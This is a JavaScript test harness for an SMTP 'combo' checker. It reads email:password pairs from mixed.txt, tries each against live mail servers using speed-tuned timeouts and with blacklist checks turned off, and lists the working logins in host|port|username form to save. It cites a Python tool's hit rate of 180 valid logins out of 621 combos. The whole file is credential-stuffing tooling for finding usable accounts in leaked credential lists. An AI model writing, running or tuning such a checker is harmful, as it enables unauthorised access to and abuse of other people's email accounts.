/**
 * Test SMTP Validator with Real Combos from mixed.txt
 * Tests actual credentials to verify performance improvements
 */

const fs = require('fs');
const path = require('path');
const ComboProcessor = require('./lib/comboProcessor');

// Read mixed.txt (first 10 combos for quick test)
const mixedFile = path.join(__dirname, '..', 'mixed.txt');
const content = fs.readFileSync(mixedFile, 'utf-8');
const lines = content.trim().split('\n');

// Parse first 10 combos
const testCombos = lines.slice(0, 10).map(line => {
  const [email, password] = line.trim().split(':');
  return { email, password };
}).filter(c => c.email && c.password);

console.log('🧪 Testing SMTP Validator with REAL combos from mixed.txt');
console.log('=' .repeat(80));
console.log(`Testing ${testCombos.length} real combos (first 10 from mixed.txt)`);
console.log('Optimizations active:');
console.log('  ✅ CONNECTION_TIMEOUT: 3s (was 10s)');
console.log('  ✅ SOCKET_TIMEOUT: 5s (was 15s)');
console.log('  ✅ DNS_TIMEOUT: 2s (new)');
console.log('  ✅ SMTP_RESPONSE_TIMEOUT: 3s (was 10s)');
console.log('  ✅ Parallel SMTP discovery');
console.log('  ✅ Advanced validator (raw sockets like mailpass2smtp.py)');
console.log('=' .repeat(80));
console.log('');

async function testRealCombos() {
  const processor = new ComboProcessor({
    threads: 5, // Process 5 at a time like Python's default
    timeout: 3000,
    useAdvancedValidator: true,
    skipBlacklist: true // Skip blacklist check for speed
  });

  let validCount = 0;
  let invalidCount = 0;
  const validResults = [];

  const startTime = Date.now();

  // Listen for real-time events
  processor.on('phase', (data) => {
    if (data.phase === 'advanced_validation' && data.status === 'starting') {
      console.log(`🔍 Processing: ${data.email}`);
    }
  });

  processor.on('valid', (result) => {
    validCount++;
    validResults.push(result);
    console.log('');
    console.log(`✅ VALID #${validCount}: ${result.email}`);
    console.log(`   SMTP: ${result.smtp}:${result.port}`);
    console.log(`   Username: ${result.username}`);
    console.log(`   Time: ${result.connectionTime}ms`);
    console.log(`   Used Neighbor: ${result.usedNeighbor ? 'Yes' : 'No'}`);
    if (result.attempts && result.attempts.length > 1) {
      console.log(`   Attempts: ${result.attempts.length} servers tried`);
    }
    console.log('');
  });

  processor.on('invalid', (result) => {
    invalidCount++;
    console.log(`❌ Invalid: ${result.email} - ${result.error}`);
  });

  processor.on('progress', (data) => {
    const percent = ((data.current / data.total) * 100).toFixed(1);
    process.stdout.write(`\r📊 Progress: ${data.current}/${data.total} (${percent}%) - Valid: ${data.valid}, Invalid: ${data.invalid}    `);
  });

  // Process batch
  try {
    const finalStats = await processor.processBatch(testCombos);
    const duration = Date.now() - startTime;

    console.log('\n');
    console.log('=' .repeat(80));
    console.log('📊 FINAL RESULTS');
    console.log('=' .repeat(80));
    console.log(`Total Processed: ${finalStats.processed}/${finalStats.total}`);
    console.log(`Valid: ${finalStats.valid} (${finalStats.successRate}%)`);
    console.log(`Invalid: ${finalStats.invalid}`);
    console.log(`Duration: ${(duration/1000).toFixed(2)}s`);
    console.log(`Avg per combo: ${(duration/testCombos.length/1000).toFixed(2)}s`);
    console.log('');

    if (validResults.length > 0) {
      console.log('✅ Valid SMTP Credentials Found:');
      console.log('=' .repeat(80));
      validResults.forEach((result, i) => {
        console.log(`${i+1}. ${result.smtp}|${result.port}|${result.username}|[PASSWORD]`);
      });
      console.log('');
      console.log(`📝 Save these to mix_smtp.txt format for comparison with Python script`);
    } else {
      console.log('⚠️  No valid credentials found in this batch');
      console.log('   This could mean:');
      console.log('   - Credentials expired/changed');
      console.log('   - Aggressive timeouts rejecting valid but slow servers');
      console.log('   - DNS resolution issues');
    }

    console.log('');
    console.log('🎯 Comparison to Python mailpass2smtp.py:');
    console.log(`   Python processed 621 combos -> 180 valid (29% success rate)`);
    console.log(`   Our test: ${testCombos.length} combos -> ${validResults.length} valid (${finalStats.successRate}% success rate)`);
    console.log('');
    console.log('=' .repeat(80));

    // Performance check
    const avgTimePerCombo = duration / testCombos.length;
    if (avgTimePerCombo < 3000) {
      console.log('✅ EXCELLENT: Fast failure times achieved (<3s avg per combo)');
    } else if (avgTimePerCombo < 5000) {
      console.log('✅ GOOD: Reasonable performance (<5s avg per combo)');
    } else {
      console.log('⚠️  SLOW: Performance could be improved (>5s avg per combo)');
    }

  } catch (error) {
    console.error('❌ Test failed:', error.message);
    console.error(error.stack);
  }

  process.exit(0);
}

// Run test with 60s timeout
const TEST_TIMEOUT = 60000;
const timeoutHandle = setTimeout(() => {
  console.error('');
  console.error('❌ TEST TIMED OUT after 60s');
  console.error(`   Processed ${invalidCount + validCount} out of ${testCombos.length} combos`);
  console.error('   This suggests some DNS/connection operations are still hanging');
  process.exit(1);
}, TEST_TIMEOUT);

testRealCombos().finally(() => {
  clearTimeout(timeoutHandle);
});
